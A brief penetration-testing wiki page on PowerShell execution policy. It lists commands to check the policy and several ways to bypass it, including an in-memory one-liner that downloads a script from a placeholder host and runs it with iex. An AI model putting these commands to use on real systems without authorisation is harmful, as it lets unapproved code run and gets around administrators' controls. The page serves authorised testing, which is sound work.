# Powershell Restricted Mode

https://viperone.gitbook.io/pentest-everything/everything/powershell/restricted-mode

## Description

PowerShell's execution policy is a safety feature that controls the conditions under which PowerShell loads configuration files and runs scripts. This feature helps prevent the execution of malicious scripts.

On a Windows computer you can set an execution policy for the local computer, for the current user, or for a particular session. You can also use a Group Policy setting to set execution policies for computers and users.

## TIP: Microsoft stress in their documentation that Execution Policy / Restricted Mode is a safety feature and not a security feature.

## Enumeration

    Get-ExecutionPolicy | Format-Table -AutoSize

## Bypass

There are many ways to bypass the restriction. Most methods are based on reading the contents of the script and piping to the PowerShell.exe process in some way. 

    Get-Content .\Script.ps1 | powershell.exe -nop

##### Read contents and pipe to Powershell.exe (Writes to disk)

    Get-Content .\Script.ps1 | powershell.exe -nop
    Type .\Script.ps1 | powershell.exe -nop

##### Download and execute (In Memory)

    powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://<IP>/<File>')"

##### Potential simple bypass (Writes to disk)

    powershell -ep Bypass .\Script.ps1
    powershell -ep Unrestricted .\Script.ps1

##### Bypass process scope

    Set-ExecutionPolicy Bypass -Scope Process

##### Bypass current user scope

    Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
